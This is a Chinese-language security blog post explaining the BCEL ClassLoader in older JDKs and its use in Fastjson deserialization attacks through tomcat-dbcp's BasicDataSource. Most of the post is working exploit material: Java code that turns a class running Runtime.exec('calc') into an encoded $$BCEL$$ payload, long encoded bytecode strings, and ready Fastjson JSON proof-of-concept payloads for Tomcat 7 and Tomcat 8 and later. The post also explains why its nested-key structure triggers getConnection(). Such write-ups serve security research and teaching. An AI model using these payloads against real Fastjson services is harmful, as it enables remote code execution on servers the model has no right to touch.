---
title: Java安全之BCEL ClassLoader
date: 2024-03-13 16:53:00 +0800
img_path: /
categories: [Java安全, BCEL ClassLoader]
tags: [Java安全, BCEL ClassLoader]     
---

# Java安全之BCEL ClassLoader

## BCEL ClassLoader如何使用

在`JDK<JDK8u251`的版本里`BCEL`这个包中有个有趣的类`com.sun.org.apache.bcel.internal.util.ClassLoader`，他是一个`ClassLoade`r，但是他重写了Java内置的`ClassLoader#loadClass()`方法。

在`ClassLoader#loadClass()`中，其会判断类名是否是`$$BCEL$$`开头，如果是的话，将会对这个字符串进行`decode`。

![image-20240313170215806](assets/image-20240313170215806.png)

我们尝试写一个恶意类通过BCEL去加载：

```java
package org.example;

import java.io.IOException;

public class Calc {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

```java
package org.example;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;

public class Bcel {

    public static void main(String[] args) throws Exception {
        JavaClass javaClass = Repository.lookupClass(Calc.class);
        String code = "$$BCEL$$"+Utility.encode(javaClass.getBytes(),true);
        System.out.println(code);

        new ClassLoader().loadClass(code).newInstance();
    }
}

```

将`Calc`这个恶意类通过BCEL生成BCEL形式的字节码。加载后便执行了类中的`static`方法。

![image-20240313170504150](assets/image-20240313170504150.png)

也可以这样：

```java
package org.example;

public class ClassLoaderDemo {
    public static void main(String[] args) {
        try {
Class.forName("$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3d$D$85B$zo$f1$fdb$r$b8$a0$hw$Q7$8a$h$f0$R1$b8$$$e3$E$HKKJ$n$fc$91k6j$5c$f8$B$7e$94$f1N$r$80$b1I$ef$c9$3ds$k$9d$7e$7d$7f$7c$C8E$c9$80$8eu$DEl$q$b0$a9pK$c7$b6$8e$j$j$bb$M$f1$batep$c6$Q$zW$3a$M$da$b9$f7$u$Y2$z$e9$8a$eb$f1$a0$x$fc$7b$bb$eb$Q$93oy$dcv$3a$b6$_$d5$3e$t$b5$e0I$8e$94$da$f3$7b$d6$85$YxVc$o$9d$gC$a2$ce$9dyn$aa$j$d8$fc$f9$ca$k$86$kjf0$da$de$d8$e7$e2R$aa$8c$a4$b2T$fb$f6$c46$91$40R$c7$9e$89$7d$iP$G$f5$f1$aa$98$K$T$878b$u$u$8d$e5$d8n$cfjL$b9$Y$G$d2s$v$feO5Cv$a9$ba$e9$f6$F$P$YrK$ean$ec$Gr$40$adFO$E$8b$a5X$ae$b4$fei$e8$W$g$95s$86$e3$f2$cai$3b$f0$a5$db$ab$ad$gn$7d$8f$8b$d1$a8$86$S$e2$f4$ab$d5$T$BS$97$a1i$d0f$R2$c2$d8$c9$h$d8$y$3c$5e$a3$Z$P$c9$uL$9a$e6$af$A$v$a4$J$T$c8$y$cc$cd0$MH$bf$p$92$8f$beB$7bx$81$d6$9c$85$5c$92$7c1JPiiB$95$99$a4OHQ$82$Z$f6$AYzuDZ$3ar$mS$3e$a4$L$3f$qO$d5$f4$k$C$A$A",true,new com.sun.org.apache.bcel.internal.util.ClassLoader());
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        }
    }
}
```



## BCEL在Fastjson漏洞中的利用

当前网络上广泛流传的利用链主要有以下三个：

- `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`
- `com.sun.rowset.JdbcRowSetImpl`
- `org.apache.tomcat.dbcp.dbcp2.BasicDataSource`

第一个是通过`TemplatesImpl`加载恶意字节码，但是要求是开启` Feature.SupportNonPublicField`也就是：`JSON.parseObject(jsonString, Feature.SupportNonPublicField);`，但是实战中很少遇到这样的情况所以不是好用。

第二个是通过`JNDI`注入的形式加载远程服务器上的恶意类，既然需要加载远程恶意类所以要求目标机器出网，这种情况就不适用不出网的机器。

第三个就是利用了依赖包 `tomcat-dbcp` 指定`BCEL ClassLoader `加载恶意类，这种情况不需要目标机器出网，但是要求目标服务器的JDK版本小于8u251，因为在大于该版本的JDK中删除了`com.sun.org.apache.bcel.internal.util.ClassLoader`。

`dbcp`通过控制`DriverClassName`加载恶意类：

```java
package org.example;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;

public class DbcpDemo {
    public static void main(String[] args) throws Exception {
        BasicDataSource basicDataSource = new BasicDataSource();
        String calc = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbn$d3$40$U$3d$93$97c$d7i$f3$m$8f$96$3ey$ra$817$ec$S$b1$a9$40B$b8$a4j$a2T$5dN$86$n$99$e0$d8$91$e3$b4$f9$p$d6$d9$A$C$J$f6$7c$U$e2$8e$89$d2$a8$c5$92$ef$9d$7b$ce$b9$e7$5e$8f$7f$ff$f9$fe$T$c0K4$y$98$a8Y$d8$c5$5e$W$Pu$de7p$60$e0$d0B$GG$G$8e$N$9c0d$da$caW$d1$x$86d$a3$d9gH$9d$G$l$q$c3$8e$ab$7c$f9$7e$3e$Z$c8$b0$c7$H$k$nE7$Q$dc$eb$f3P$e9z$F$a6$a2$91$9a$c5$5c8t$e4$82O$a6$9etN$b9$tZ$M$d9$b6$f0V$d6$8c$a4ew$cc$af$b9$a3$C$e7m$e7$f5B$c8i$a4$C$9fd$b9n$c4$c5$a73$3e$8d$ziA$G$ab$h$ccC$n$df$u$3d$c2$d4v$_t$af$N$L$5b$G$k$d9x$8c$t4$9b$d6$R6$9e$e2$ZC$e9$3f$de$M$7b1$eaq$7f$e8$5c$cc$fdHM$e4$9a$d4$5eu$86$fc$dd$bd$J$bam$ea$M$c6RD$M$85$7b$3e$b4$e3PF$eb$a2$dch$ba$f74$f4m$v$b9$90dYol$b0$dd$uT$fe$b0$b5$d9p$k$GB$cef$d4P$dbT$f6Fap$a3$_$a5$d5$ec$e3$EY$fa$9b$faI$80$e9$8b$a0hS$e5Pf$94$d3$cf$bf$82$zc$3aG1$f3$P$c46E$7bu$deA$9er$W$85u$f3G$qc$ae$fa$N$89b$f2$LR$97$9f$91$7b$f7$D$99$xr3$7e$zc$d2$qi$9a$84$da$b6B$t$c4$9bl$Rj$Sf$Rf$af$c7$e4$I$x$a2D$d5$Dz$N$q$5c$De$93$88J$bcY$f5$_$i$9b$a2$9e$9c$C$A$A";
        ClassLoader classLoader = new ClassLoader();
        basicDataSource.setDriverClassLoader(classLoader);
        basicDataSource.setDriverClassName(calc);
        basicDataSource.getConnection();
    }
}
```

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class FastjsonDemo {
    public static void main(String[] args) {
        String exp1 = "{\n" +
                "        \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "        \"driverClassLoader\": {\n" +
                "            \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3d$D$85B$zo$f1$fdb$r$b8$a0$hw$Q7$8a$h$f0$R1$b8$$$e3$E$HKKJ$n$fc$91k6j$5c$f8$B$7e$94$f1N$r$80$b1I$ef$c9$3ds$k$9d$7e$7d$7f$7c$C8E$c9$80$8eu$DEl$q$b0$a9pK$c7$b6$8e$j$j$bb$M$f1$batep$c6$Q$zW$3a$M$da$b9$f7$u$Y2$z$e9$8a$eb$f1$a0$x$fc$7b$bb$eb$Q$93oy$dcv$3a$b6$_$d5$3e$t$b5$e0I$8e$94$da$f3$7b$d6$85$YxVc$o$9d$gC$a2$ce$9dyn$aa$j$d8$fc$f9$ca$k$86$kjf0$da$de$d8$e7$e2R$aa$8c$a4$b2T$fb$f6$c46$91$40R$c7$9e$89$7d$iP$G$f5$f1$aa$98$K$T$878b$u$u$8d$e5$d8n$cfjL$b9$Y$G$d2s$v$feO5Cv$a9$ba$e9$f6$F$P$YrK$ean$ec$Gr$40$adFO$E$8b$a5X$ae$b4$fei$e8$W$g$95s$86$e3$f2$cai$3b$f0$a5$db$ab$ad$gn$7d$8f$8b$d1$a8$86$S$e2$f4$ab$d5$T$BS$97$a1i$d0f$R2$c2$d8$c9$h$d8$y$3c$5e$a3$Z$P$c9$uL$9a$e6$af$A$v$a4$J$T$c8$y$cc$cd0$MH$bf$p$92$8f$beB$7bx$81$d6$9c$85$5c$92$7c1JPiiB$95$99$a4OHQ$82$Z$f6$AYzuDZ$3ar$mS$3e$a4$L$3f$qO$d5$f4$k$C$A$A\"\n" +
                "}\n";
        String exp2 = "{\n" +
                "    {\n" +
                "        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                "        \"x\":{\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbn$d3$40$U$3d$93$97c$d7i$f3$m$8f$96$3ey$ra$817$ec$S$b1$a9$40B$b8$a4j$a2T$5dN$86$n$99$e0$d8$91$e3$b4$f9$p$d6$d9$A$C$J$f6$7c$U$e2$8e$89$d2$a8$c5$92$ef$9d$7b$ce$b9$e7$5e$8f$7f$ff$f9$fe$T$c0K4$y$98$a8Y$d8$c5$5e$W$Pu$de7p$60$e0$d0B$GG$G$8e$N$9c0d$da$caW$d1$x$86d$a3$d9gH$9d$G$l$q$c3$8e$ab$7c$f9$7e$3e$Z$c8$b0$c7$H$k$nE7$Q$dc$eb$f3P$e9z$F$a6$a2$91$9a$c5$5c8t$e4$82O$a6$9etN$b9$tZ$M$d9$b6$f0V$d6$8c$a4ew$cc$af$b9$a3$C$e7m$e7$f5B$c8i$a4$C$9fd$b9n$c4$c5$a73$3e$8d$ziA$G$ab$h$ccC$n$df$u$3d$c2$d4v$_t$af$N$L$5b$G$k$d9x$8c$t4$9b$d6$R6$9e$e2$ZC$e9$3f$de$M$7b1$eaq$7f$e8$5c$cc$fdHM$e4$9a$d4$5eu$86$fc$dd$bd$J$bam$ea$M$c6RD$M$85$7b$3e$b4$e3PF$eb$a2$dch$ba$f74$f4m$v$b9$90dYol$b0$dd$uT$fe$b0$b5$d9p$k$GB$cef$d4P$dbT$f6Fap$a3$_$a5$d5$ec$e3$EY$fa$9b$faI$80$e9$8b$a0hS$e5Pf$94$d3$cf$bf$82$zc$3aG1$f3$P$c46E$7bu$deA$9er$W$85u$f3G$qc$ae$fa$N$89b$f2$LR$97$9f$91$7b$f7$D$99$xr3$7e$zc$d2$qi$9a$84$da$b6B$t$c4$9bl$Rj$Sf$Rf$af$c7$e4$I$x$a2D$d5$Dz$N$q$5c$De$93$88J$bcY$f5$_$i$9b$a2$9e$9c$C$A$A\"\n" +
                "        }\n" +
                "    }: \"x\"\n" +
                "}";

        JSONObject jsonObject = JSON.parseObject(exp1);
        Object parse = JSON.parse(exp2);
    }
}
```

`tomcat7`：`org.apache.tomcat.dbcp.dbcp.BasicDataSource`

```xml
    <!-- https://mvnrepository.com/artifact/org.apache.tomcat/dbcp -->
    <dependency>
        <groupId>org.apache.tomcat</groupId>
        <artifactId>dbcp</artifactId>
        <version>6.0.53</version>
    </dependency>
```

POC：

```Json
{
    {
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        }
    }: "x"
}
```

`tomcat8`及其以后：`org.apache.tomcat.dbcp.dbcp2.BasicDataSource`

```xml
	<!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp -->
    <dependency>
        <groupId>org.apache.tomcat</groupId>
        <artifactId>tomcat-dbcp</artifactId>
        <version>9.0.8</version>
    </dependency>
```

POC：

```Json
{
    {
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        }
    }: "x"
}
```

这里PoC结构上还有一个值得注意的地方在于，

1. 先是将 `{"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"……} `这一整段放到`JSON Value`的位置上，之后在外面又套了一层 `{}`。
2. 之后又将` Payload `整个放到了`JSON` 字符串中 `Key `的位置上。

为什么这么设计呢？

因为为了完成前面说的一整个利用链，我们需要触发上方例子中的 `BasicDataSource.getConnection()` 方法。

具体细节请看 [FastJson反序列化漏洞利用的三个细节](https://mp.weixin.qq.com/s/C1Eo9wst9vAvF1jvoteFoA)，简单说就是：`FastJson`中的` JSON.parse() `会识别并调用目标类的 `setter` 方法以及某些满足特定条件的 `getter` 方法，然而` getConnection() `并不符合特定条件，所以正常来说在 `FastJson` 反序列化的过程中并不会被调用。原`PoC`中很巧妙的利用了 `JSONObject`对象的 `toString()` 方法实现了突破。`JSONObject`是Map的子类，在执行`toString() `时会将当前类转为字符串形式，会提取类中所有的`Field`，自然会执行相应的 `getter` 、`is`等方法。

## 